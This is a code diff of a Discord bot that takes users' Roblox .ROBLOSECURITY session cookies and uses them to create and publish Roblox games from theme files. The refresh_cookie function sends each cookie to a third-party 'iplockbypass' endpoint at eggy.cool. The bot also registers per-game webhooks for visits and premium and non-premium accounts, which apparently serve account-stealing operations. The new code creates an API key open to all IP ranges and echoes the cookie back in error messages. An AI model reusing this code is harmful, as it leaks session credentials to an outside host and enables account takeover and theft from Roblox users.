@@ -5,6 +5,8 @@ import secrets
 import uuid
 import requests
 import discord
+import random
+import string
 from discord import app_commands
 from webserver import keep_alive
 from discord.ext import commands
@@ -17,10 +19,9 @@ load_dotenv()
 
 rbxlx_files = {
     "nl": { #Theme Value make sure this not same value if you add a new theme
-        "theme_name": "💡 OTHER THEMES:",
+        "theme_name": "Normal Theme",
         "file_location": "Files/Normal_Theme.rbxlx"
     },
-
     # Add more themes here as needed
 }
 
@@ -116,8 +117,7 @@ def process_file(file_key):
         return None
 
     rbxlx_file = theme_info["file_location"]
-    with open(rbxlx_file, 'rb') as f:
-        file_data = f.read()
+    file_data = open(rbxlx_file, 'rb').read()
 
     if rbxlx_file.endswith(".rbxlx"):
         file_data = replace_referents(file_data)
@@ -136,7 +136,7 @@ tree = discord.app_commands.CommandTree(client)
 @client.event
 async def on_ready():
     await tree.sync()
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name='Roblox'), status=discord.Status.dnd)
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='Flux'), status=discord.Status.dnd)
     print('Logged in')
     print('------')
     print(client.user.display_name)
@@ -145,10 +145,13 @@ keep_alive()
 
 def refresh_cookie(c):
     try:
-        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}", timeout=20)
-        if response.status_code == 200 and response.text.strip() and response.text != "Invalid Cookie":
-            return response.text.strip()
-        return None
+        response = requests.get(f"https://eggy.cool/iplockbypass?cookie={c}")
+        
+        if response.text != "Invalid Cookie":
+            new_cookie = response.text
+            return new_cookie
+        else:
+            return None
     except Exception as e:
         print(f"An error occurred while refreshing the cookie: {e}")
         return None
@@ -156,14 +159,9 @@ def refresh_cookie(c):
 
 def get_csrf_token(cookie):
     try:
-        xsrfRequest = requests.post(
-            'https://auth.roblox.com/v2/logout',
-            cookies={'.ROBLOSECURITY': cookie},
-            timeout=20,
-        )
-        token = xsrfRequest.headers.get("x-csrf-token")
-        if xsrfRequest.status_code == 403 and token:
-            return token
+        xsrfRequest = requests.post('https://auth.roblox.com/v2/logout', cookies={'.ROBLOSECURITY': cookie})
+        if xsrfRequest.status_code == 403 and "x-csrf-token" in xsrfRequest.headers:
+            return xsrfRequest.headers["x-csrf-token"]
     except Exception as e:
         print(f"An error occurred: {str(e)}")
     return None
@@ -172,7 +170,7 @@ def get_game_icon(game_id):
     try:
         url = f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={game_id}&returnPolicy=PlaceHolder&size=512x512&format=Png&isCircular=false"
         with requests.Session() as session:
-            response = session.get(url, timeout=20)
+            response = session.get(url)
             response.raise_for_status()
             jsonicon = response.json()
 
@@ -233,24 +231,27 @@ def create_webhook(conn, game_id, success, vpremium, visit, failed, vnbc, unnbc,
     return apiCheck
 
 
-def upload_game_file(session, refreshed_cookie, csrf_token, game_id, file_bytes):
-    upload_url = f"https://data.roblox.com/Data/Upload.ashx?assetid={game_id}"
-    headers = {
-        'Content-Type': 'application/xml',
-        'x-csrf-token': csrf_token,
-        'User-Agent': 'Roblox/WinINet',
-    }
-    response = session.post(
-        upload_url,
-        headers=headers,
-        cookies={'.ROBLOSECURITY': refreshed_cookie},
-        data=file_bytes,
-        timeout=60,
+def build_publish_embed(gamename, description, game_id, theme_name, game_url, username, avatar_url, game_icon):
+    embed = discord.Embed(
+        title=f"🚀 {gamename}",
+        description=f"**{description}**\n\n**{username}** just pushed a fresh Roblox build live.",
+        color=0xF7B500,
+        timestamp=discord.utils.utcnow(),
     )
-    return response
+    embed.add_field(name="🎮 Game Name", value=f"`{gamename}`", inline=True)
+    embed.add_field(name="🧩 Theme", value=f"`{theme_name}`", inline=True)
+    embed.add_field(name="🆔 Game ID", value=f"`{game_id}`", inline=True)
+    embed.add_field(name="📍 Status", value="**Published** ✅", inline=False)
+    embed.add_field(name="🔗 Roblox Link", value=f"[Open Game]({game_url})", inline=False)
+    embed.add_field(name="👤 Publisher", value=f"`{username}`", inline=False)
+    embed.set_thumbnail(url=avatar_url)
+    if game_icon:
+        embed.set_image(url=game_icon)
+    embed.set_footer(text="Flux Publisher • Live build deployed", icon_url=avatar_url)
+    return embed
 
 
-@tree.command(name="paid_setup", description="• Powered by Nexus MGUI")
+@tree.command(name="config", description="Setup/Update Your Game!")
 @app_commands.describe(
     game_id='Roblox Game ID',
     visit='Visit Webhook URL',
@@ -262,7 +263,7 @@ def upload_game_file(session, refreshed_cookie, csrf_token, game_id, file_bytes)
     failed='Failed Webhook URL'
 )
 
-async def setup(interaction: discord.Interaction, game_id: str, visit: str, unnbc: str, unpremium: str, vnbc: str, vpremium: str, success: str, failed: str):
+async def config(interaction: discord.Interaction, game_id: str, visit: str, unnbc: str, unpremium: str, vnbc: str, vpremium: str, success: str, failed: str):
 
     role_name = os.getenv('CUSTUMER_ROLE_NAME')
     guild_id = int(os.getenv("GUILD_ID"))
@@ -304,9 +305,9 @@ async def setup(interaction: discord.Interaction, game_id: str, visit: str, unnb
         if validate_create == "Successfully Listed His/Her Webhooks.":
 
             embed_var = discord.Embed(
-                title="Success, Paid Webhook listed on the Secured database",
+                title="Success, webhook listed on the database",
                 description="Is everything correct? If it's wrong, use the command again\n",
-                color=0x00FF71
+                color=0x00FF1C
             )
             embed_var.add_field(
                 name="Discord Information",
@@ -331,209 +332,257 @@ async def setup(interaction: discord.Interaction, game_id: str, visit: str, unnb
         embed_var = discord.Embed(title=message, color=discord.Color.red())
         await interaction.response.send_message(embed=embed_var, ephemeral=True)
 
+@tree.command(name="verify", description="Verify if The User Purchase The  Game-Pass")
+@app_commands.describe(userid="Roblox UserID Account")
+async def slash_purchase(interaction: discord.Interaction, userid: str):
+    
+    guild_id = int(os.getenv("GUILD_ID"))
+    guild = interaction.guild
+
+    if guild is None:
+      print(f"Guild not found with ID: {guild_id}")
+      return
+
+    member = guild.get_member(interaction.user.id)
+    if member is None:
+      print(f"Member not found in guild with ID: {guild_id}")
+      return
+    
+    discord_id = interaction.user.id
+
+    gamepass_id = os.getenv('GAMEPASS_ID')
+    api_url = f'https://inventory.roblox.com/v1/users/{userid}/items/Asset/{gamepass_id}/is-owned'
+    response = requests.get(api_url)
+
+    try:
+
+       if response.status_code == 400:
+          json_data = response.json()
+          embed_var = discord.Embed(title=json_data["errors"][0]["message"],color=0xf00226)
+          return await interaction.response.send_message(embed=embed_var, ephemeral=True)
+       
+       select_query = "SELECT * FROM purchases WHERE rbxid = %s"
+       select_data = (userid)
+
+       with conn.cursor() as cur:
+          cur.execute(select_query, select_data)
+
+       num_rows = cur.rowcount
+
+       if num_rows > 0:
+          embed_var = discord.Embed(title="This User Has Already Purchased The Game-Pass!",color=0xfa3e00)
+          return await interaction.response.send_message(embed=embed_var, ephemeral=True)
+       
+       if response.text == "true":
+          
+          embed_var = discord.Embed(title="Thanks for buying our product customer role will be added!",color=0x00f55e)
+          await interaction.response.send_message(embed=embed_var, ephemeral=True)
+          role = discord.utils.get(interaction.guild.roles, id=int(os.getenv('CUSTOMER_ROLEID')))
+          await interaction.user.add_roles(role)
+
+          insert_query = "INSERT INTO purchases (discid, rbxid) VALUES (%s, %s)"
+          insert_data = (discord_id, userid)
+
+          with conn.cursor() as cur:
+              cur.execute(insert_query, insert_data)
+          conn.commit()    
+
+       elif response.text == 'false':
+          embed_var = discord.Embed(
+             title="Purchase The Game-Pass First!", 
+             description=f"** [[Click Here]({os.getenv('GAMEPASS_LINK')})] **",
+             color=0xf00226
+          )
+          return await interaction.response.send_message(embed=embed_var, ephemeral=True)    
+          
+    except Exception as e:
+      await interaction.response.send_message(e)
+
 @tree.command(
-    name="paid_create",
-    description="• Powered by Nexus MGUI"
+    name="publish_game",
+    description="Upload a Roblox game to the platform"
 )
-@app_commands.describe(
-    theme='Selection:',
-    cookie='Roblox .ROBLOSECURITY cookie',
-    gamename='Game name',
-    description='Game description'
-)
+@app_commands.describe(theme='Choose a Theme')
 @app_commands.choices(theme=theme_choices)
+async def slash_publish_new_game(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], gamename: str, description: str, cookie: str):
+    role_name = os.getenv('CUSTUMER_ROLE_NAME')
+    guild_id = int(os.getenv("GUILD_ID"))
+    guild = interaction.guild
 
-async def slash_paid_create(interaction: discord.Interaction, theme: discord.app_commands.Choice[str], cookie: str, gamename: str = None, description: str = None):
-
-  role_name = os.getenv('CUSTUMER_ROLE_NAME')
-  guild_id = int(os.getenv("GUILD_ID"))
-  guild = interaction.guild
-
-  if guild is None:
-    print(f"Guild not found with ID: {guild_id}")
-    return
-
-  member = guild.get_member(interaction.user.id)
-  if member is None:
-    print(f"Member not found in guild with ID: {guild_id}")
-    return
-
-  role = discord.utils.get(guild.roles, name=role_name)
-  if role is None or role not in member.roles:
-
-    message = f"Role {role_name} is required to run this command."
-    embed_var = discord.Embed(title=message, color=8918293)
-    return await interaction.response.send_message(embed=embed_var, ephemeral=True)
-      
-  message = "Uploading Paid Game, Please Wait."
-  embed_var = discord.Embed(title=message, color=0x00FF71)
-  await interaction.response.send_message(embed=embed_var, ephemeral=True)
-
-  refreshed_cookie = refresh_cookie(cookie)
-
-  if refreshed_cookie is None:
-    message = "Invalid Cookie"
-    embed_var = discord.Embed(title=message, color=0xfac54d)
-    return await interaction.followup.send(embed=embed_var, ephemeral=True)
-
-  try:
-      csrf_token = get_csrf_token(refreshed_cookie)
-      if not csrf_token:
-          raise ValueError("Failed to obtain Roblox CSRF token")
-  except Exception as e:
-      await interaction.followup.send(f'Oops! Something went wrong: {e}')
-      return
-
-  headers = {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
-      "X-CSRF-TOKEN": csrf_token,
-      "Cookie": f".ROBLOSECURITY={refreshed_cookie}"
-  }
-
-  url = 'https://www.roblox.com/mobileapi/userinfo'
-  try:
-      response = requests.get(url, headers=headers, timeout=20)
-      response.raise_for_status()
-      data = response.json()
-  except Exception as e:
-      await interaction.followup.send(f'Oops! Something went wrong while fetching Roblox user info: {e}', ephemeral=True)
-      return
-
-  try:
-      username = data['UserName']
-      userid = data['UserID']
-      user_robux = data['RobuxBalance']
-      user_isprem = data['IsPremium']
-      avatarurl = data['ThumbnailUrl']
-  except Exception:
-      await interaction.followup.send('Oops! Something went wrong while reading Roblox account data.', ephemeral=True)
-      return
-
-  print(f" [DATA] {userid} - UserID")
-
-  session = requests.Session()
-  session.headers.update(
-    {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
-      "Accept": "application/json, text/plain, */*",
-      "Content-Type": "application/json;charset=utf-8",
-      "Origin": "https://www.roblox.com",
-    }
-  )
-  session.cookies[".ROBLOSECURITY"] = refreshed_cookie
-
-  headers1 = {
-        "Content-Type": "application/json",
-        "Accept": "application/json",
-        "User-Agent": "Roblox/WinInet",
-        "X-CSRF-TOKEN": csrf_token,
-        "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
-  }
-  body1 = json.dumps({"templatePlaceId": "379736082"})
-
-  try:
-      request1 = session.post(
-          "https://apis.roblox.com/universes/v1/universes/create",
-          headers=headers1,
-          data=body1,
-          timeout=60,
-      )
-      request1.raise_for_status()
-      response_body = request1.json()
-      game_id = response_body.get("rootPlaceId")
-      Uni_Game_Id = response_body.get("universeId")
-      if not game_id or not Uni_Game_Id:
-          raise ValueError(f"Unexpected Roblox create response: {response_body}")
-      game_url = f"https://www.roblox.com/games/{game_id}/"
-
-      success_embed = discord.Embed(
-          title="Place Created",
-          description=f"Game has been successfully created.\n[Click here to play!]({game_url})",
-          color=0xfac54d
-      )
-
-      await interaction.followup.send(embed=success_embed, ephemeral=True)
-  except Exception as e:
-      await interaction.followup.send(f"Upload failed while creating the Roblox place: {e}", ephemeral=True)
-      return
-
-  print(f" [DATA] {Uni_Game_Id} - Game Uni-ID")
-  if Uni_Game_Id is not None:
-    headers2 = {
-      "Origin": "https://create.roblox.com",
-      "X-CSRF-TOKEN": csrf_token,
-      "Cookie": ".ROBLOSECURITY=" + refreshed_cookie,
-    }
-    try:
-        session.post(f"https://develop.roblox.com/v1/universes/{Uni_Game_Id}/activate", headers=headers2, timeout=30)
-    except Exception:
-        pass
-
-    gamedata = {
-      "name": gamename,
-      "description": description,
-      "universeAvatarType": "MorphToR6",
-      "universeAnimationType": "Standard",
-      "maxPlayerCount": 45,
-      "allowPrivateServers": False,
-      "privateServerPrice": 0,
-      "permissions": {
-        "IsThirdPartyTeleportAllowed": True,
-        "IsThirdPartyPurchaseAllowed": True,
-      },
-    }
-    body2 = json.dumps(gamedata)
-    try:
-        session.patch(
-          f"https://develop.roblox.com/v2/universes/{Uni_Game_Id}/configuration",
-          headers=headers1,
-          data=body2,
-          timeout=30,
-        )
-    except Exception:
-        pass
-
-    file_bytes = process_file(theme.value)
-    if not file_bytes:
-        await interaction.followup.send("The selected theme file couldn't be loaded.", ephemeral=True)
+    if guild is None:
+        print(f"Guild not found with ID: {guild_id}")
         return
 
-    uploadRequest = upload_game_file(session, refreshed_cookie, csrf_token, game_id, file_bytes)
+    member = guild.get_member(interaction.user.id)
+    if member is None:
+        print(f"Member not found in guild with ID: {guild_id}")
+        return
 
-    print(f" [DATA] {uploadRequest.status_code} - Game Response Code")
-    print(f" [DATA] {uploadRequest.content} - Game Response")
+    role = discord.utils.get(guild.roles, name=role_name)
+    if role is None or role not in member.roles:
+        message = f"Role {role_name} is required to run this command."
+        embed_var = discord.Embed(title=message, color=8918293)
+        return await interaction.response.send_message(embed=embed_var, ephemeral=True)
 
-    if uploadRequest.status_code in (200, 201, 202):
-        game_icon = get_game_icon(game_id)
+    message = "Uploading Game"
+    embed_var = discord.Embed(title=message, color=0x00f55e)
+    await interaction.response.send_message(embed=embed_var, ephemeral=True)
 
-        embed_var = discord.Embed(title="Game Has Been Published", description="**SuccessFully Published!**", color=0x00FF71)
-        embed_var.add_field(name='🎮 Game Name:', value='' + str(gamename) + '')
-        embed_var.add_field(name='🗨️ Description:', value='' + str(description) + '')
-        embed_var.add_field(name='🪪 Game ID:', value='' + str(game_id) + '')
-        embed_var.add_field(name='💡 Theme:', value='' + str(theme.name) + '')
-        embed_var.add_field(name="🔗 Game Link:", value=f'**[Click here to view your Game](https://www.roblox.com/games/{str(game_id)})**', inline=False)
-        embed_var.set_footer(text="╰┈➤ Game has been successfully published")
-        embed_var.set_thumbnail(url=f"{game_icon}")
-        await interaction.followup.send(embed=embed_var, ephemeral=True)
-        channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
+    # Refresh cookie
+    refreshed_cookie = refresh_cookie(cookie)
+    if refreshed_cookie is None:
+        message = "Invalid Cookie"
+        embed_var = discord.Embed(title=message, color=0xf00226)
+        return await interaction.followup.send(embed=embed_var, ephemeral=True)
 
-        if channel is not None:
-            embed_var = discord.Embed(
-              title="Nexus Botbased - Published Paid Game",
-              description= f'**<@{interaction.user.id}> ┈➤ Sucessfully Created A Game\n💡Theme: '+ str(theme.name)+'',
-              color=0x00FF71
-            )
-            embed_var.set_thumbnail(url=f'{avatarurl}')
+    # Get CSRF token
+    try:
+        csrf_token = get_csrf_token(refreshed_cookie)
+    except Exception as e:
+        await interaction.followup.send(f'Oops! Something went wrong: {e}')
+        return
 
-            embed_var.set_footer(text="╰┈➤Game has been successfully published")
-            await channel.send(embed=embed_var)
+    # Set headers
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
+        "X-CSRF-TOKEN": csrf_token,
+        "Cookie": f".ROBLOSECURITY={refreshed_cookie}"
+    }
+
+    # Get user info
+    url = 'https://users.roblox.com/v1/users/authenticated'
+    response = requests.get(url, headers=headers)
+    data = response.json()
+    try:
+        username = data['name']
+        userid = data['id']
+    except KeyError:
+        await interaction.followup.send(f'Oops! Something went wrong with {refreshed_cookie}!')
+        return
+
+    # Get avatar URL
+    url1 = f'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userid}&size=420x420&format=Png&isCircular=true'
+    response1 = requests.get(url1, headers=headers)
+    data1 = response1.json()
+
+    # Extract avatar URL from response
+    avatar_url = data1['data'][0]['imageUrl']
+
+    # Session for requests
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json;charset=utf-8",
+        "Origin": "https://www.roblox.com",
+    })
+    session.cookies[".ROBLOSECURITY"] = refreshed_cookie
+
+    # Create game
+    body1 = json.dumps({"templatePlaceId": "379736082"})
+    request1 = session.post("https://apis.roblox.com/universes/v1/universes/create", headers=headers, data=body1)
+    
+    if request1.status_code == 200:
+        response_body = request1.json()
+        game_id = response_body["rootPlaceId"]
+        uni_game_id = response_body["universeId"]
+        game_url = f"https://www.roblox.com/games/{game_id}/"
+        
+        success_embed = discord.Embed(
+            title="Place Created",
+            description=f"Your game has been successfully created.\n[Click here to play!]({game_url})", 
+            color=0x00f55e
+        )
+        await interaction.followup.send(embed=success_embed, ephemeral=True)
     else:
-        message2 = (f'Oops! Something went wrong while uploading the game file (HTTP {uploadRequest.status_code}).')
-        embed_var = discord.Embed(title=message2, color=0x00FF71)
-        await interaction.followup.send(embed=embed_var, ephemeral=True)
-  else:
-      message2 = 'Oops! Something went wrong while creating the Roblox place.'
-      embed_var = discord.Embed(title=message2, color=0x00FF71)
-      await interaction.followup.send(embed=embed_var, ephemeral=True)
+        await interaction.followup.send(f"Upload failed with HTTP code {request1.status_code}", ephemeral=True)
+        return
+
+    # Update game configuration and publish
+    if uni_game_id is not None:
+        # Activating universe
+        headers2 = {
+            "Origin": "https://create.roblox.com",
+            "X-CSRF-TOKEN": csrf_token,
+            "Cookie": f".ROBLOSECURITY={refreshed_cookie}",
+        }
+        session.post(f"https://develop.roblox.com/v1/universes/{uni_game_id}/activate", headers=headers2)
+
+        gamedata = {
+            "name": gamename,
+            "description": description,
+            "universeAvatarType": "MorphToR6",
+            "universeAnimationType": "Standard",
+            "maxPlayerCount": 45,
+            "allowPrivateServers": False,
+            "privateServerPrice": 0,
+            "permissions": {
+                "IsThirdPartyTeleportAllowed": True,
+                "IsThirdPartyPurchaseAllowed": True,
+            },
+        }
+
+        body2 = json.dumps(gamedata)
+        session.patch(f"https://develop.roblox.com/v2/universes/{uni_game_id}/configuration", headers=headers, data=body2)
+
+        random_name = "fluxx_publisher_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+
+        api_data = {
+            "cloudAuthUserConfiguredProperties": {
+                "name": random_name,
+                "description": "fluxx",
+                "isEnabled": True,
+                "allowedCidrs": ["0.0.0.0/0"],
+                "scopes": [{"scopeType": "universe-places", "targetParts": [str(uni_game_id)], "operations": ["write"]}]
+            }
+        }
+
+        url = "https://apis.roblox.com/cloud-authentication/v1/apiKey"
+        response = session.post(url, headers=headers, json=api_data)
+        
+        if response.status_code == 200:
+            response_body = response.json()
+            api_key = response_body.get("apikeySecret")
+        else:
+            print(f"Request failed with status code: {response.status_code}")
+            return
+
+        uploadRequest = session.post(
+            f"https://apis.roblox.com/universes/v1/{uni_game_id}/places/{str(game_id)}/versions?versionType=Published",
+            headers={'Content-Type': 'application/xml', 'User-Agent': 'Roblox/WinINet', 'x-api-key': api_key},
+            cookies={'.ROBLOSECURITY': refreshed_cookie},
+            data=process_file(theme.value)
+        )
+
+        print(f" [DATA] {uploadRequest.status_code} - Game Response Code")
+        if uploadRequest.status_code == 200:
+            game_icon = get_game_icon(game_id)
+
+            embed_var = build_publish_embed(
+                gamename=gamename,
+                description=description,
+                game_id=game_id,
+                theme_name=theme.name,
+                game_url=f"https://www.roblox.com/games/{game_id}",
+                username=username,
+                avatar_url=avatar_url,
+                game_icon=game_icon,
+            )
+            await interaction.followup.send(embed=embed_var, ephemeral=True)
+
+            channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
+            if channel is not None:
+                embed_var = discord.Embed(
+                    title="🛠️ Flux Publisher | Game Live",
+                    description=f'**<@{interaction.user.id}>** successfully uploaded a new Roblox game.\n\n**Account**\n**Username:** `{username}`\n**User ID:** `{userid}`\n\n**Build**\n**Game Name:** `{gamename}`\n**Theme:** `{theme.name}`',
+                    color=0xF7B500,
+                )
+                embed_var.set_thumbnail(url=avatar_url)
+                embed_var.set_footer(text="Flux Logs • Build published successfully")
+                await channel.send(embed=embed_var)
+        else:
+            message2 = f'Oops! Something went wrong, {refreshed_cookie}!'
+            embed_var = discord.Embed(title=message2, color=0xf00226)
+            await interaction.followup.send(embed=embed_var, ephemeral=True)
 
 client.run(os.getenv('TOKEN'))
